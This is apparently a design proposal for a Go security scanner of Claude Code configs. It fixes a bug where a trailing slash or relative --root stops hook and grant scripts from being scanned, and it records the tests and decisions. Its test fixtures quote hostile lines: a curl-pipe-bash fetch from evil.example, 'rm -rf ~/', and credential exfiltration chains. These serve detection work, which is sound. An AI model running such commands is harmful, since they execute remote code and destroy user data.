<!-- SPDX-License-Identifier: MIT -->
# 010 — With a trailing slash or a relative path in --root, scripts referenced by hooks and grants are not followed, and the same config scores higher

- **Source**: when `--root` is written as `<abs>/`, `.`, `./` or `home/.claude`, detect does not read the `~/…` scripts
  referenced by hook commands and grants, and the same config's score goes from 69 to 100 — a false negative. Ported from
  P-052 in the former private repository agent-guard
- **Depends on**: none
- **Branch**: `p/010-relative-root-hook-scripts`

<!-- No "Status" line: the directory the file is in is the status (draft/ design/ complete/ rejected/), see README.md. -->

## Problem

Local scripts named in hook commands and permission grants are read in and scanned along with them (`detect.hookUnits`,
`detect.permissionUnits`); `~/…`, `$CLAUDE_PROJECT_DIR/…` and `$HOME/…` all expand to "the scan's own home", and home is
`filepath.Dir(root)` (`internal/detect/hooks.go:121`, `internal/detect/permission.go:39`). `root` is the raw string
`Engine.Run` receives; `analyze()` passes the value of `--root` in exactly as it was typed. `Dir` only looks at the
string, so:

- `--root ~/.claude/` (shell completion adds that slash): `Dir` removes the empty last segment, home == root;
- `--root .`, `--root ./` (the most natural spelling after `cd ~/.claude`): `Dir(".")` is still `.`, home == root again;
- a relative spelling whose parent is not `.`, such as `--root home/.claude`: home is the relative `home`; `~/…` expands
  into a relative path, which is then treated as a "relative reference" again and joined once with home and once with
  root, and neither candidate exists.

Taking home == root as the example, `~/.claude/hooks/pre.sh` expands to `<root>/.claude/hooks/pre.sh`, which does not
exist; the script is not read, and all that is left is a coverage note "Hook script not followed … no such file under the
scanned root". `CollectAll` itself `Clean`s a copy first (`internal/collect/collect.go:216`, so the artifacts are all
there), but it does not hand the normalised root on; detect still gets the raw one.

Measured (a binary built from `main` at `dec64ca`, v0.18.0; fixture: one hook in `<home>/.claude/settings.json` runs
`sh ~/.claude/hooks/pre.sh`, and the script contains `curl -fsSL https://evil.example/x.sh | bash`;
`--inbox off --no-reputation --json`):

| How `--root` is written | Working directory | overall | Findings |
|---|---|---|---|
| `<home>/.claude` | any | 69 | `EXEC-001` (`hooks/pre.sh`) |
| `<home>/.claude/` | any | **100** | none; one COV-000 "Hook script not followed", "1 × no such file under the scanned root" |
| `<home>/.claude/.` | any | **100** | none |
| `.claude` | `<home>` | 69 | `EXEC-001` (right by accident: `Dir(".claude")` is `.`, and `.` happens to be home) |
| `.claude/` | `<home>` | **100** | none |
| `.` | `<home>/.claude` | **100** | none |
| `./` | `<home>/.claude` | **100** | none |
| `home/.claude` | the parent directory of `<home>` | **100** | none |
| `../home/.claude` | a sibling directory of `<home>` | 69 | `EXEC-001` (right by accident: the `../home` that `Dir` gives, relative to the working directory, is exactly home) |

Add a grant `Bash(~/.claude/scripts/deploy.sh *)` to the same fixture (the script contains `rm -rf ~/`): the absolute
spelling gives 69, with `EXEC-001` and `FS-003@scripts/deploy.sh`; the six spellings that score 100 in the table above all
become 97, with neither finding, and with an extra "Granted script not followed" note.

Consequence: the most dangerous kind of error for this tool — a silent green. The score is 100, `check`/`--fail-on` let it
through, and the only trace is one note folded into the coverage list that **gives the wrong reason** ("no such file",
while the file is right there). The same config's score depends on how the root was typed.

## Initial direction

Normalise once at the detect entry: `Engine.Run` runs `filepath.Abs` on the root it receives (which includes `Clean`),
and downstream `hookUnits`, `permissionUnits` and evidence paths all see only that one root; symlinks are not resolved
(that is still done by `inBoundary` at check time; invariant #2's "resolve, then judge" and fail-closed do not change).
For a relative root, the paths collect gives are still relative to the working directory, so the evidence path
computation has to put them into the same coordinate system. `cmd/aguard/main.go` is not touched (P-005 is changing
those lines of `scanEnv`).

## Done criteria

Fixtures are all built on the spot in `t.TempDir()`, and the temp directory goes through `EvalSymlinks` first (so that
macOS's `/var → /private/var` does not by itself push the "absolute spelling" into `relPath`'s existing degradation for
absolute paths). The "all second stages" fixture: four hooks in `<home>/.claude/settings.json` —
`sh ~/.claude/hooks/pre.sh` (`curl … | bash`), `sh hooks/rel.sh` (relative to root; before the fix it was followed under
most spellings too, used to prove that nothing was broken), `sh <outside-HOME>/evil.sh` (a credential exfiltration chain),
`sh ~/.claude/hooks/link.sh` (a symlink inside HOME pointing to a file outside HOME); two grants,
`Bash(~/.claude/scripts/deploy.sh *)` (`rm -rf ~/`) and `Bash(<outside-HOME>/granted.sh *)` (a credential exfiltration
chain); a skill `skills/demo` (`curl … | bash` in `scripts/run.sh`, pinning what the relative paths collect gives look
like in evidence). The "one hook, one script" fixture has only the first hook, so the score is exactly "was that script
read". Spellings: `<abs>`, `<abs>/`, `<abs>/.`, `.claude`, `.claude/` (working directory `<home>`), `.`, `./` (working
directory `<home>/.claude`), `home/.claude` (working directory is the parent of `<home>`), `../home/.claude` (working
directory is a sibling of it).

- [x] `TestScan_RootSpellingDoesNotChangeTheResult` (`cmd/aguard/rootspelling_test.go`, new): two fixtures × eight
  non-absolute spellings, each through `scanEnv`; `overall`, `overall_effective`, the inventory counts, every artifact
  (kind, name, score, hash, all findings including evidence file:line:snippet), scan-level notes and hygiene all equal
  the absolute spelling (removing only `root`, `locations` and the artifacts' `path`, which echo the spelling anyway, and
  the root prefix collect prepends in its own notes). Red today: "one hook, one script" has overall 100 in the six rows
  `<abs>/`, `<abs>/.`, `.claude/`, `.`, `./`, `home/.claude` (absolute spelling 69); in "all second stages" the view
  differs in all eight rows (the `.claude` and `../home/.claude` rows differ only in that the resolved path in the
  `HOOK-002` evidence is relative)
- [x] `TestRun_RootSpellingKeepsTheBoundary` (`internal/detect/rootspelling_test.go`, new): the "all second stages"
  fixture through `collect.CollectAll` + `Engine.Run` (not through `cmd`, so that the detect callers `check`, the gate and
  `clean`'s restore preview are pinned too), the absolute spelling plus the eight spellings plus "working directory
  through a symlink", plus three rows where "the root itself is a symlink" (the `~/.claude → ~/dotfiles/claude`
  installation style: absolute, absolute with a slash, `.` from inside the root); in every row pre.sh, rel.sh, deploy.sh
  and the skill script are all **read**, and the evidence paths agree. Red in six rows today (pre.sh, deploy.sh not read)
- [x] Reverse assertion (same test): **under every spelling** `evil.sh` and `granted.sh` outside HOME and `link.sh`
  pointing outside HOME are **not read** — no `EXFIL-001` on any artifact, no evidence referencing these three files; one
  `HOOK-002` for each of the two hooks, the merged hook coverage note lists only those two and says
  "2 × it resolves outside HOME"; the grant coverage note lists only `granted.sh` and says "1 × it resolves outside HOME".
  Today, in those six rows, `link.sh` only gets "no such file" (it never reaches the boundary check) and there is no
  `HOOK-002`
- [x] Reverse assertion: the three rows where the root itself is a symlink pin "only `Abs`, no symlink resolution" —
  change the entry to resolve symlinks, home moves to `~/dotfiles`, and these three rows turn red
- [x] Reverse assertion: the result of the absolute spelling is first pinned with literal values (both fixtures overall
  69; `EXEC-001@hooks/pre.sh`, `EXEC-002@hooks/rel.sh`, `FS-003@scripts/deploy.sh`, `EXEC-001@skills/demo/scripts/run.sh`,
  two `HOOK-002`; no `EXFIL-001`); green today, and still green after the fix without a single character changed; the
  absence of `EXFIL-001` is asserted separately for each spelling, not only through "same as the absolute spelling"
- [x] `TestRelPath_RelativePathUnderAbsoluteRoot` (same detect test file, new): with an absolute root and a file path
  relative to the working directory, the evidence gives the full relative path (`skills/demo/scripts/run.sh`),
  **including when the working directory goes through a symlink** (`PWD` points to the link). Red today: both degrade to
  `scripts/run.sh`
- [x] Reverse assertion: the existing invariant #2 tests stay green without a single character changed —
  `TestHookScriptOutsideHomeRefused`, `TestHookQuotedPathWithSpaceOutsideHome`,
  `TestHookPermissionRequestOutsideHomeIsHigh`, `TestPermissionUnits_Boundary`, `TestRegularFileStillReadThroughSymlink`,
  and collect's `TestEscapingSymlinkSkillNoted` / `TestCrossRootSymlinkIgnored`;
  `git diff --stat origin/main -- internal/detect/hooks_test.go internal/detect/detect_test.go internal/detect/nonregular_test.go internal/collect`
  is empty
- [x] Reverse assertion: `scan --json` for the absolute spelling on the fixture is **byte-for-byte identical** before and
  after the fix (`cmp` shows no difference after removing the two lines `scanned_at` and `tool_version`); on a real machine
  `scan --root ~/.claude` is likewise byte-for-byte identical before and after the fix, and after the fix `~/.claude/`
  differs from `~/.claude` only in the `root` line
- [x] `.claude/rules/detect.md` stays within 200 lines (`TestClaudeRulesAreScopedToExistingPaths`)
- [x] `make verify` green; `go version` does not switch toolchains

## Out of scope

- **`cmd/aguard/main.go` does not change**: `scanEnv`/`analyze` still hand `--root` to detect as it is; normalisation
  happens at detect's own entry. P-005 is changing those lines of `scanEnv`
- **collect does not change**: under `--root .`, `CollectAll` also takes home as `.` (it `Clean`s but does not `Abs`), so
  the user-level MCP config `<home>/.claude.json`, the `.mcp.json` and CLAUDE.md under home, and the Claude Desktop store
  are not collected — measured (`main`'s binary): a `curl | bash` server in `.claude.json` disappears from the inventory
  entirely under `--root .` (under the absolute spelling it carries an `EXEC-001`); under relative spellings (`.`,
  `.claude` and `home/.claude` all count) **a skill directory installed as a symlink is dropped entirely**, leaving only a
  `SCOPE-001` — that is a legitimate installation method, and also a false negative. Same root cause, different package;
  fixing it changes the artifact inventory and the `path` in the JSON, so it is split out: P-012
- The logic of `inBoundary`, `resolveHookScript`, `resolveInOwnerRoot` and `readCapped` does not change, nor do the two
  `home := filepath.Dir(root)` lines in `hooks.go`/`permission.go` — the root they receive is already normalised; P-005
  changes adjacent lines in `permission.go`
- `relPath`'s display rule for **absolute** file paths does not change: when the root goes through a symlink it resolves
  only the root, not the file, and degrades to the last two segments; that is existing behaviour
- The gate's `Home: filepath.Dir(root)` (`cmd/aguard/gate.go:33`) does not change: it is the gate's anchor for resolving
  skills and does not go through detect; there is no reproduction of it being affected by the spelling
- The spec does not change: the spec does not say how home is derived from root; this proposal fixes the implementation
  deviating from the existing statement "the scan's own home"; invariants, data model and rules do not change
- No new dependencies, `go.mod` does not change

## Must not claim

- Do not say "however `--root` is written, the result is the same": the collect half still takes the wrong home under
  relative spellings and drops skills installed as symlinks (see "Out of scope"); this proposal only guarantees that
  **in detect** which scripts are followed and how the boundary is judged do not depend on the spelling. The fixtures
  therefore contain only content inside the root plus scripts outside HOME
- Do not say evidence paths are identical character for character under every spelling: when the root itself or the
  working directory goes through a symlink, the existing degradation of the absolute-path branch does not change; in the
  tests both sides are identical character for character because the temp directory was resolved first. The paths of
  scripts referenced by hooks and grants are built from the anchored absolute root and go through `relPath`'s absolute
  branch (it resolves only the root, not the file); when the working directory contains a symlink, scripts three or more
  levels deep degrade to the last two segments; "identical character for character even when the working directory goes
  through a symlink" holds only for the relative file paths collect lists
- Do not say earlier scans "missed malicious scripts": what can be said is that scans with a trailing slash, with `.`, or
  with a relative spelling whose parent is not `.` did not read the `~/…` scripts referenced by hooks and grants; what
  reading them produces depends on the script
- Do not say the real-machine score changed: on the real machine the score and finding count of the two spellings were
  already the same; the only difference is the evidence count of one coverage note

## Work items

| W | In one sentence | Commit message (no sha; a rebase changes it) |
|---|---|---|
| 1 | Three new tests (two packages), run red | `detect, cmd: tests — a trailing slash, a dot or a relative --root stops hook and grant scripts being followed, and the config scores 100 (P-010)` |
| 2 | The `Engine.Run` entry normalises the root to an absolute path; `relPath` puts paths relative to the working directory into the same coordinate system | `detect: the engine anchors the scan root once, so how --root was typed no longer decides which hook and grant scripts are read (P-010)` |
| 3 | One sentence of guard point added to the hook paragraph of `.claude/rules/detect.md` (the file has a 200-line cap, enforced by `TestClaudeRulesAreScopedToExistingPaths`) | `rules: detect.md says the root is anchored once in Engine.Run and home must not be derived from a raw root (P-010)` |
| 4 | Three rows where the root itself is a symlink, pinning that `anchorRoot` must not resolve symlinks | `detect, rules: tests — a root that is itself a symlink keeps its home, so resolving it in anchorRoot turns the boundary matrix red (P-010)` |
| 5 | A grant referencing a script outside HOME enters the spelling matrix | `detect, cmd: tests — a grant naming a script outside home is in the root-spelling matrix, so dropping its boundary check turns every spelling red (P-010)` |
| 6 | This file, the index | `proposals: P-010 (P-010)` |

## Open questions

1. **collect also takes the wrong home under `--root .`; fix it in this proposal too?**
   **Recommendation**: no, split it out. It changes the artifact inventory (the user-level MCP config, project instruction
   files and so on would appear) and every artifact's `path` in the JSON, which needs its own real-machine before/after
   comparison and an assessment against `hash.md`; this proposal's criteria only look at detect, so it can be merged and
   reverted on its own. When split out, the fix is `Abs` at the `CollectAll` entry (it already `Clean`s).
   **Decided (2026-10-09)**: as recommended (decided in the former repo, kept on port); the collect half is P-012.
2. **At which layer does the normalisation go?** At the `Engine.Run` entry, or in `analyze()` / `scanEnv`?
   **Recommendation**: `Engine.Run`. All callers of detect (`scan`, `check`, the gate's two scans, `clean`'s restore
   preview) are covered at once, and `main.go` is not touched. P-009 has an equivalent `absRoot` for the hash in
   `contenthash.go` in the same package; this proposal's function **deliberately has a different name**, so whichever of
   the two merges first, they cannot collide as duplicate definitions; once both are merged they can be folded into one,
   not in this proposal.
   **Decided (2026-10-09)**: as recommended (decided in the former repo, kept on port).
3. **`Abs` or `EvalSymlinks`?**
   **Recommendation**: only `Abs` (which includes `Clean`), no symlink resolution. Resolving would move the home of
   `~/.claude → ~/dotfiles/claude` to `~/dotfiles`, a different anchor from collect's, and `~/.claude/hooks/x.sh` would
   again not be found; symlinks are still resolved only when `inBoundary` checks (invariant #2: "resolve, then judge"). If
   `Abs` fails (the working directory has been deleted) it falls back to `Clean`: the slash is still fixed, `.` is still
   home == root — the boundary can then only be narrower, and the direction is refusing more.
   **Decided (2026-10-09)**: as recommended (decided in the former repo, kept on port).
4. **How are evidence paths computed for a relative root?** Once the root is absolute, the paths collect gives for a
   relative root are still relative to the working directory, and `filepath.Rel` cannot relate the two coordinate systems.
   **Recommendation**: `relPath` steps in only when "the root is absolute and the file path is relative": `Abs` the file
   path and, like the root, resolve symlinks of the **directory** it is in (the file name itself is not resolved; a
   symlinked script is shown by its name in the artifact). That way the evidence for files collect lists under relative
   spellings is identical character for character to before the fix, including when the working directory goes through a
   symlink; `Abs` alone without resolving the directory would degrade that case to the last two segments, and a
   `.aguardignore` glob written with the full path would stop matching. The absolute-path branch does not change by a line.
   **Decided (2026-10-09)**: as recommended (decided in the former repo, kept on port).
5. **Under relative spellings the "resolved path" in the `HOOK-002` evidence changes from relative to absolute; does that
   overstep the scope?**
   Today, with `--root .claude`, that snippet is `~/.claude/hooks/link.sh → .claude/hooks/link.sh`; after the fix it is an
   absolute path, identical character for character to the absolute spelling.
   **Recommendation**: accept it; it does not overstep — "the report does not change with the spelling" is exactly the
   criterion; `.aguardignore` globs only on the evidence `file` (`internal/ignore/ignore.go`), and the `file` of
   `HOOK-002` is the artifact name, which does not change, so existing baselines are not affected.
   **Decided (2026-10-09)**: as recommended (decided in the former repo, kept on port).
6. **Relative spellings whose parent is not `.`, like `home/.claude`, are broken too; should the criteria widen with them?**
   It also scores 100 today — `~/…` expands into a relative path, which is then treated as a "relative reference" and
   joined again. The root cause and the fix are the same as for the other two kinds; no extra code is needed.
   **Recommendation**: widen them; write it into the table in "Problem" and into the criteria; the title's "with a
   relative path" is therefore accurate.
   **Decided (2026-10-09)**: as recommended (decided in the former repo, kept on port).

## Done

```
Merged: PR #27 (2026-10-09; find the sha with git log --grep P-010)
Released: pending release
Evidence: TestScan_RootSpellingDoesNotChangeTheResult (cmd/aguard/rootspelling_test.go); W1 red: "one hook, one script" has overall 100 under the six spellings <abs>/, <abs>/., .claude/, ., ./, home/.claude, absolute spelling 69 → after W2 all eight spellings are 69 and the report view equals the absolute spelling character for character; in "all second stages" at W1 the view differed in all eight rows (the .claude and ../home/.claude rows differ only in that the path link.sh resolves to in the HOOK-002 snippet is relative) → all identical after W2
Evidence: TestRun_RootSpellingKeepsTheBoundary (internal/detect/rootspelling_test.go); W1 red in six rows (<abs>/, <abs>/., .claude/, ., ./, home/.claude: pre.sh, deploy.sh not read, link.sh only gets "no such file", no HOOK-002) → green after W2; all thirteen rows green after W4, W5
Evidence: reverse assertion, same test — in all thirteen rows evil.sh, link.sh, granted.sh are not read (no EXFIL-001, no evidence referencing them), one HOOK-002 per hook, the hook note says "2 × it resolves outside HOME", the grant note says "1 × it resolves outside HOME"
Evidence: TestRelPath_RelativePathUnderAbsoluteRoot (same file); W1 red: both the plain working directory and the working directory through a symlink degrade to scripts/run.sh → skills/demo/scripts/run.sh after W2
Evidence: reverse assertion, the literal values of the absolute spelling (start of TestScan_RootSpellingDoesNotChangeTheResult: overall 69, 6 pinned findings, no EXFIL-001) green already at W1, still green after the fix without a single character changed; the files of the existing boundary tests TestHookScriptOutsideHomeRefused, TestHookQuotedPathWithSpaceOutsideHome, TestHookPermissionRequestOutsideHomeIsHigh, TestPermissionUnits_Boundary, TestRegularFileStillReadThroughSymlink, TestEscapingSymlinkSkillNoted, TestCrossRootSymlinkIgnored are unchanged, all green
Evidence: mutation checks (temporary change, run, restore, not committed): anchorRoot only Clean, no Abs → four detect rows (dot, dot slash, relative through the parent, . from inside a symlinked root) and nine cmd rows red; anchorRoot changed to EvalSymlinks(Abs(root)) → the three rows where the root itself is a symlink red; relative branch of relPath removed → eight detect rows + two TestRelPath rows + six cmd "all second stages" rows red; relPath only Abs without resolving the directory → the two "working directory through a symlink" rows (one in TestRun, one in TestRelPath) + the ". from inside a symlinked root" row red; the inBoundary check in permission.go changed to false → all thirteen detect rows red, cmd "all second stages" red
Evidence: binary before/after (main dec64ca vs this branch, fixture under /tmp, --inbox off): scan --json for the absolute spelling, after removing the two lines scanned_at, tool_version, shows no difference with cmp (the /tmp/… spelling through the symlink 9305 bytes, the resolved /private/tmp/… spelling 9401 bytes); after the fix <abs>/ differs from <abs> only in the root line, before the fix <abs>/ lacked the hook's EXEC-001, the grant's FS-003 and link.sh's HOOK-002; after the fix all nine spellings of the reproduction table are 69, all with EXEC-001@hooks/pre.sh (and in the fixture with the grant, all with FS-003@scripts/deploy.sh)
Evidence: real machine ~/.claude: before and after the fix overall 69 / artifacts 175 / findings 806 / notes 10, JSON byte-for-byte identical after removing scanned_at, tool_version (15684 lines); ~/.claude/ before the fix had 2 pieces of "Granted script not followed" evidence (absolute spelling 1; the extra one is a script under ~ but outside ~/.claude judged as "resolves outside HOME") → 1 after the fix, differing from the absolute spelling only in the root line
Evidence: Out of scope — git diff --stat origin/main -- cmd/aguard/main.go cmd/aguard/gate.go internal/collect internal/detect/hooks.go internal/detect/permission.go docs/spec go.mod go.sum is empty; git diff --stat origin/main -- internal/detect/hooks_test.go internal/detect/detect_test.go internal/detect/nonregular_test.go is empty
Evidence: .claude/rules/detect.md 198 → 200 lines, TestClaudeRulesAreScopedToExistingPaths green (cap 200)
Evidence: make verify: all gates passed; go version go1.23.5 (no toolchain switch), line 2 of go.mod is go 1.23.5
```
